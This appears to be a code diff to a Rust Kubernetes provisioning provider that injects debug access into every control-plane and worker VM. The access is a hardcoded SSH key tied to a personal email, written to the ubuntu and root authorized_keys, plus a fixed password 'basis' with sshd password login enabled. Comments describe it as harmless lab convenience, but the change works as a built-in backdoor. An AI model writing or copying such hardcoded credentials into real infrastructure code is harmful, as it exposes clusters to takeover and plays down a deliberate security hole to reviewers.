@@ -29,7 +29,71 @@ use super::{
 };
 use crate::constants::{BASIS_API_VERSION, BASIS_VIP_INTERFACE, INFRASTRUCTURE_API_GROUP};
 use lattice_common::{Error, Result, BASIS_CREDENTIALS_SECRET, LOCAL_SECRETS_NAMESPACE};
-use lattice_crd::crd::{BasisConfig, InstanceType, LatticeCluster, ProviderSpec, ProviderType};
+use lattice_crd::crd::{
+    BasisConfig, BootstrapProvider, InstanceType, LatticeCluster, ProviderSpec, ProviderType,
+};
+
+/// Hardcoded debug SSH key, appended to `ubuntu`'s `authorized_keys` on
+/// every basis-provisioned VM. Basis is private lab infra; this is for
+/// in-VM inspection (kube-vip state, kubelet logs, cilium pods), not a
+/// security boundary.
+const DEBUG_SSH_KEY: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID1f8eVKp5YCAtis77YO/oHhWvzAiimDzlDqhtD+85YR evan.hines.dev@gmail.com";
+
+/// Password set on the `ubuntu` user, paired with `PasswordAuthentication
+/// yes` in sshd. Lets us drop into a VM from a console session even when
+/// agent-side key forwarding isn't set up.
+const DEBUG_USER_PASSWORD: &str = "basis";
+
+/// Two shell snippets to run as root after the bootstrap unit finishes.
+/// Plain post-commands — not cloud-init's `users:` / `chpasswd:`
+/// modules — because Kubeadm/RKE2 already own the cloud-init document
+/// for these manifests; appending into the post-bootstrap command list
+/// is the lowest-blast-radius hook. Both snippets are idempotent so
+/// reapply / machine rollover is safe.
+fn debug_post_commands() -> Vec<String> {
+    vec![
+        format!(
+            "mkdir -p /home/ubuntu/.ssh && \
+             grep -qF '{key}' /home/ubuntu/.ssh/authorized_keys 2>/dev/null || \
+             echo '{key}' >> /home/ubuntu/.ssh/authorized_keys && \
+             chown -R ubuntu:ubuntu /home/ubuntu/.ssh && \
+             chmod 700 /home/ubuntu/.ssh && \
+             chmod 600 /home/ubuntu/.ssh/authorized_keys",
+            key = DEBUG_SSH_KEY,
+        ),
+        format!(
+            "echo 'ubuntu:{pw}' | chpasswd && \
+             echo 'PasswordAuthentication yes' > /etc/ssh/sshd_config.d/99-basis-debug.conf && \
+             (systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true)",
+            pw = DEBUG_USER_PASSWORD,
+        ),
+    ]
+}
+
+/// Append the debug-access shell commands to a bootstrap-config-template
+/// manifest's post-bootstrap command list. Picks the right key — Kubeadm
+/// uses `postKubeadmCommands`, RKE2 uses `postRKE2Commands` — based on
+/// the cluster's bootstrap provider. Worker pool generators in
+/// `provider/mod.rs` don't take a post-commands argument, so this
+/// mutation runs in place after the manifest is built.
+fn inject_debug_post_commands(manifest: &mut CAPIManifest, bootstrap: &BootstrapProvider) {
+    let key = match bootstrap {
+        BootstrapProvider::Rke2 => "postRKE2Commands",
+        _ => "postKubeadmCommands",
+    };
+    let Some(spec) = manifest.spec.as_mut() else {
+        return;
+    };
+    let target = &mut spec["template"]["spec"];
+    let cmds = debug_post_commands();
+    if let Some(arr) = target.get_mut(key).and_then(|v| v.as_array_mut()) {
+        for c in cmds {
+            arr.push(serde_json::Value::String(c));
+        }
+    } else {
+        target[key] = serde_json::json!(cmds);
+    }
+}
 
 /// VM sizing for a BasisMachineTemplate.
 struct MachineSizing {
@@ -210,12 +274,25 @@ impl Provider for BasisProvider {
                 BASIS_VIP_INTERFACE.to_string(),
                 cfg.kube_vip_image.clone(),
             ));
+            let mut post_kubeadm_commands = build_post_kubeadm_commands(name, bootstrap)?;
+            // Append the debug-access shell snippets so CP nodes are
+            // ssh-able the same way workers are. Goes into
+            // postKubeadmCommands / postRKE2Commands inside the CP
+            // generator depending on bootstrap provider.
+            post_kubeadm_commands.extend(debug_post_commands());
+
             let cp_config = ControlPlaneConfig {
                 replicas: spec.nodes.control_plane.replicas,
                 cert_sans,
-                post_kubeadm_commands: build_post_kubeadm_commands(name, bootstrap)?,
+                post_kubeadm_commands,
                 vip,
-                ssh_authorized_keys: Vec::new(),
+                // Existing CP plumbing writes these to root's
+                // authorized_keys (kubeadm `users[name=root]` /
+                // RKE2 `/root/.ssh/authorized_keys`). Harmless — root
+                // login is locked on Ubuntu cloud images so this is
+                // belt-and-suspenders behind the ubuntu user that
+                // debug_post_commands actually wires up.
+                ssh_authorized_keys: vec![DEBUG_SSH_KEY.to_string()],
                 registry_mirrors: bootstrap.registry_mirrors.clone(),
             };
             manifests.push(generate_control_plane(&config, &infra, &cp_config)?);
@@ -235,10 +312,12 @@ impl Provider for BasisProvider {
                 &pool_config,
             ));
             manifests.push(self.generate_machine_template(name, worker_sizing, &image, &suffix));
-            manifests.push(generate_bootstrap_config_template_for_pool(
+            let mut wp_template = generate_bootstrap_config_template_for_pool(
                 &config,
                 &pool_config,
-            ));
+            );
+            inject_debug_post_commands(&mut wp_template, &spec.provider.kubernetes.bootstrap);
+            manifests.push(wp_template);
         }
 
         Ok(manifests)
